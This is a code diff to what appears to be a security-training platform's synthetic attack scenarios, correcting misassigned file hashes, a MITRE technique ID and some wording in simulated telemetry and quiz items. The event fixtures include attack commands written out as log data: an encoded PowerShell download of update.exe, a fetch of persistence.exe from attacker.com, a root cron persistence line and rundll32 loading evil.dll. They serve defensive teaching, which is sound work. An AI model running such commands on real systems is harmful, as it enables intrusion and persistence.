@@ -5045,6 +5045,12 @@ export function buildDNSTunnelingScenario(scenarioId = "dns-tunneling-2026"): Sc
   const victimIp = "10.100.50.20";
   const c2Domain = "c2-nexus-update.xyz";
   const dnscat2Hash = makeSha256("dnscat2_client_2.4.0");
+  // The PROCESS in evt_dns_01 is powershell.exe, a signed Microsoft binary; the
+  // file it downloads is update.exe. Both previously carried dnscat2Hash, so one
+  // SHA256 described two files and a student pivoting on the process hash would
+  // have concluded powershell.exe was the implant. Same defect the neighbouring
+  // LOLBins scenario has an explicit comment about having already fixed.
+  const powershellBinaryHash = makeSha256("powershell_exe_system_binary");
 
   const events: TelemetryEvent[] = [
     // T+0: PowerShell downloads dnscat2 (T1059.001)
@@ -5059,7 +5065,7 @@ export function buildDNSTunnelingScenario(scenarioId = "dns-tunneling-2026"): Sc
         parent_name: "cmd.exe", parent_pid: 7700,
         cmdline: "powershell.exe -WindowStyle Hidden -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAYwBsAGkAZQBuAHQALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwADAALgA1AC8AdQBwAGQAYQB0AGUALgBlAHgAZQAiACwAIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcAHUAcABkAGEAdABlAC4AZQB4AGUAIgApAA==",
         user: "a.jones", integrity: "medium",
-        hash: { sha256: dnscat2Hash },
+        hash: { sha256: powershellBinaryHash },
       },
       file: { name: "update.exe", path: "C:\\Windows\\Temp\\update.exe", sha256: dnscat2Hash, size: 1048576 },
       raw: {
@@ -5074,7 +5080,7 @@ export function buildDNSTunnelingScenario(scenarioId = "dns-tunneling-2026"): Sc
         "ProcessId": "7744",
         "ProcessCommandLine": "powershell.exe -WindowStyle Hidden -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAYwBsAGkAZQBuAHQALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAo...",
         "ProcessIntegrityLevel": "Medium",
-        "SHA256": dnscat2Hash,
+        "SHA256": powershellBinaryHash,
         "InitiatingProcessFileName": "cmd.exe",
         "InitiatingProcessFolderPath": "C:\\Windows\\System32\\cmd.exe",
         "InitiatingProcessId": "7700",
@@ -5403,6 +5409,13 @@ export function buildLOLBinsScenario(scenarioId = "lolbins-2026"): ScenarioBundl
   // certutil.exe is a signed Windows binary — it cannot share a hash with the
   // payload it fetched, and the platform teaches hash-based pivoting.
   const certutilBinaryHash = makeSha256("certutil_exe_system_binary");
+  // Same principle, two more files. `payloadHash` was previously reused as the
+  // hash of the bitsadmin-fetched binary AND of the rundll32.exe process image,
+  // so one SHA256 described three different files — in a scenario whose own
+  // q1 explanation says "one SHA256 identifies one file". A student pivoting on
+  // that hash would have concluded rundll32.exe was malware.
+  const bitsPayloadHash   = makeSha256("bitsadmin_fetched_svchost_update_exe");
+  const rundll32BinaryHash = makeSha256("rundll32_exe_system_binary");
 
   const events: TelemetryEvent[] = [
     // T-2min: Phishing email delivers the macro that spawns cmd.exe (initial access)
@@ -5671,7 +5684,7 @@ export function buildLOLBinsScenario(scenarioId = "lolbins-2026"): ScenarioBundl
         user: "s.patel", integrity: "medium",
         hash: { sha256: makeSha256("bitsadmin_system_binary") },
       },
-      file: { name: "svchost_update.exe", path: "C:\\ProgramData\\nexacorp\\svchost_update.exe", sha256: payloadHash, size: 307200 },
+      file: { name: "svchost_update.exe", path: "C:\\ProgramData\\nexacorp\\svchost_update.exe", sha256: bitsPayloadHash, size: 307200 },
       network: { url: "http://attacker.com/persistence.exe", domain: "attacker.com", bytes_out: 307200 },
       raw: {
         "event.provider": "Microsoft Defender ATP",
@@ -5711,7 +5724,11 @@ export function buildLOLBinsScenario(scenarioId = "lolbins-2026"): ScenarioBundl
         parent_name: "powershell.exe", parent_pid: 6200,
         cmdline: "rundll32.exe C:\\Users\\Public\\evil.dll,DllMain",
         user: "s.patel", integrity: "medium",
-        hash: { sha256: payloadHash },
+        // The PROCESS here is rundll32.exe, a signed Microsoft binary. The
+        // payload is the DLL it loads, in the `file` block below, which keeps
+        // payloadHash. Setting the process hash to the payload's would teach a
+        // student pivoting on SHA256 that rundll32.exe itself is malware.
+        hash: { sha256: rundll32BinaryHash },
       },
       file: { name: "evil.dll", path: "C:\\Users\\Public\\evil.dll", sha256: payloadHash, size: 204800, extension: ".dll" },
       raw: {
@@ -5729,7 +5746,7 @@ export function buildLOLBinsScenario(scenarioId = "lolbins-2026"): ScenarioBundl
         "InitiatingProcessAccountName": "s.patel",
         "InitiatingProcessAccountDomain": "NEXACORP",
         "ProcessIntegrityLevel": "Medium",
-        "SHA256": payloadHash,
+        "SHA256": rundll32BinaryHash,
         "AccountName": "s.patel",
         "AccountDomain": "NEXACORP",
         "FileOriginUrl": "C:\\Users\\Public\\evil.dll",
@@ -7185,7 +7202,6 @@ export function buildSupplyChainScenario(scenarioId = "supply-chain-2026"): Scen
         "cs.CommandLine": "bash /tmp/netpulse-update/install.sh --quiet --no-restart",
         "cs.ParentBaseFileName": "netpulse-agent",
         "cs.UserName": "root",
-        "cs.IntegrityLevel": "4096",
         "host.os.type": "linux",
         "host.os.name": "Ubuntu",
         "host.os.version": "22.04.3 LTS",
@@ -7281,7 +7297,6 @@ export function buildSupplyChainScenario(scenarioId = "supply-chain-2026"): Scen
         "cs.CommandLine": "bash -c 'echo \"*/15 * * * * root /lib/x86_64-linux-gnu/netpulse-telemetry-svc ...\" > /etc/cron.d/netpulse-health'",
         "cs.ParentBaseFileName": "netpulse-telemetry-svc",
         "cs.UserName": "root",
-        "cs.IntegrityLevel": "4096",
         "host.os.type": "linux",
         "cron.schedule": "*/15 * * * *",
         "cron.path": "/etc/cron.d/netpulse-health",
@@ -7441,7 +7456,7 @@ export function buildSupplyChainScenario(scenarioId = "supply-chain-2026"): Scen
     { type: "ip",     value: attacker.ip,          reputation: "malicious",  tags: ["external-infrastructure", "netherlands"] },
     { type: "ip",     value: attacker.relayIp,      reputation: "malicious",  tags: ["attacker-relay", "singapore"] },
     { type: "domain", value: attacker.c2Domain,     reputation: "malicious",  tags: ["c2", "fake-telemetry", "self-signed"] },
-    { type: "sha256", value: malDllHash,             reputation: "malicious",  tags: ["trojanized-dll", "supply-chain", "netpulse"] },
+    { type: "sha256", value: malDllHash,             reputation: "malicious",  tags: ["trojanized-shared-object", "supply-chain", "netpulse"] },
     { type: "user",   value: victim.adminEmail,      reputation: "suspicious", tags: ["compromised-credentials", "devops"] },
     { type: "url",    value: `https://${attacker.c2Domain}/beacon`, reputation: "malicious", tags: ["c2-beacon"] },
   ];
@@ -7466,7 +7481,7 @@ export function buildSupplyChainScenario(scenarioId = "supply-chain-2026"): Scen
       prompt: "Events evt_sc_01 (proxy download) and evt_sc_02 (installer) look completely legitimate. What single artifact in evt_sc_03 retroactively marks the update as malicious?",
       kind: "single",
       options: [
-        { value: "path",    label: "The DLL runs from /lib/x86_64-linux-gnu/ not /usr/lib/netpulse/ — wrong vendor install path, plus SHA256 hash mismatch" },
+        { value: "path",    label: "The binary runs from /lib/x86_64-linux-gnu/ not /usr/lib/netpulse/ — wrong vendor install path, plus SHA256 hash mismatch" },
         { value: "size",    label: "The package is 47.3 MB, roughly triple the size of the previous NetPulse point release seen in the proxy log" },
         { value: "time",    label: "The installer executed at 14:32, outside the change-management window agreed with NetPulse for agent updates" },
         { value: "tls",     label: "The TLS certificate presented by updates.netpulse.io was self-signed rather than issued by a public CA" },
@@ -8449,7 +8464,10 @@ export function buildK8sPodEscapeScenario(scenarioId = "k8s-pod-escape-imds"): S
       id: "k8s_01_kubectl_exec",
       ts: T(0),
       source: "k8s_audit", vendor: "Kubernetes Audit",
-      event_type: "k8s_exec", severity: "medium", mitre_technique: "T1610",
+      // T1609 Container Administration Command — running a command in an
+      // EXISTING container. T1610 is Deploy Container (creating a new one),
+      // which is correct for k8s_09_privileged_pod but wrong here.
+      event_type: "k8s_exec", severity: "medium", mitre_technique: "T1609",
       hostname: "api-prod-7f8b9c", src_ip: "185.220.101.47", dst_port: 443,
       description: "The ci-deploy-token service account ran kubectl exec into container api-prod-7f8b9c from 185.220.101.47, a known Tor exit node.",
       fp_explanation: "kubectl exec is routine in dev/SRE workflows — developers regularly exec into containers for debugging. The CI/CD token is a legitimate service account. The external IP is the only initial anomaly.",
